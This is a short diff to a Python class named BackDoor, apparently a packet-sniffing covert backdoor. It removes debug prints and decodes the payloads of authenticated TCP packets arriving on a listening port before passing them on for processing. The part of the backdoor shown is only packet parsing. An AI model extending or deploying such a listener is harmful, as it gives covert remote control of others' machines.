@@ -363,14 +363,11 @@ class BackDoor:
             return
 
     def process_tcp(self, packet: Packet):
-        print("got tcp Packet")
         try:
             if TCP in packet and Raw in packet and packet[TCP].dport == self.recv_port:
-                print("In if statement")
-                raw_data = packet[Raw].load
+                raw_data = packet[Raw].load.decode()
                 val = self.authenticate_packet(raw_data, packet)
                 if val:
-                    print("got authentication flagggggggggg")
                     self.process_packet(val)
         except:
             return
